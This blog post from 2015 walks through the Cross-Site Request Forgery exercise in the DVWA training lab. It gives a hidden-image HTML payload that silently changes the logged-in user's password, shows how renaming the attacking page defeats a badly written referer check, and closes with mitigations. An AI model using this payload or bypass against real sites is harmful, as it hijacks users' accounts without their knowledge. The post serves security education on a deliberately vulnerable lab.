---
date: 2015-03-26
title: DVWA - CSRF
tags:
- dvwa
- csrf
see_also:
  -
    link: OWASP description
    url: https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)
  -
    link: Burp Suite by PortSwigger
    url: http://portswigger.net/burp/
---
Cross-Site Request Forgery aka CSRF is an attack unintentionally triggered by the user himself.
It sends HTTP requests to execute unexpected actions in different ways: trough `img` tag to perform `GET` requests or with Ajax requests when `POST` is required.
You can learn basic CSRF in [DVWA](/damn-vulnerable-web-application/ "Damn Vulnerable Web Application").

To perform this CSRF you firstly need to log in, then you must visit a malicious site who will perform a stealth HTTP request who will submit the change password form with specific values.

## Low

The original request can be found by using a local proxy like Burp Suite or analyzing HTTP headers with a browser extension like [Live HTTP Headers](https://addons.mozilla.org/fr/firefox/addon/live-http-headers/).
The payload:

```html
<html>
  <head>
    <title>My malicious website</title>
  </head>
  <body>
    <p>It works like a charm!</p>
    <img src="http://local.dvwa.com/vulnerabilities/csrf/?password_new=azerty&password_conf=azerty&Change=Change" width="1" height="1" />
  </body>
</html>
```

<!--more-->

The attributes `width` and `height` are only used to hide the broken image.
This code displays:

![dvwa csrf low](/images/dvwa-csrf-low.png)

The hash of the password changed in my database from `5f4dcc3b5aa765d61d8327deb882cf99` to `ab4f63f9ac65152575886860dde480a1`, so it worked perfectly...
We can now take a look at the Apache logs.

Access log of the malicious server:

![dvwa csrf malicious](/images/dvwa-csrf-malicious.png)

Access log of the DVWA server:

![dvwa csrf access](/images/dvwa-csrf-access.png)

However an error has been generated because we tried to display an image which is not:

![dvwa csrf error](/images/dvwa-csrf-error.png)

## Medium

In this level a protection has been implemented.
The developper checks the referer to be sure that the incoming request comes from the same local server.
However this control is defective.
If I rename my script on my malicious server from `payload.html` to `127.0.0.1.html` it will work.
Plus the regexp is mal formed and doesn't protect special chars like dot '`.`' so `127908071.html` or `aa127U0B0K1zz.php` are also valid filenames.

## High

Finally this level is well protected.
The old password is required (which should be only known by the concerned user himself) and cannot be predicted in an automated script.

There is differents ways to secure sensitive actions. A well known method is to use a random token placed in the form and checked after the submission.
Another approach is to configure the sessions to close with the browser and with a limited timelife. That way the time window when the vulnerability is effective is shorter.


## External resources

- [OWASP description](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))
- [Burp Suite by PortSwigger](http://portswigger.net/burp/)
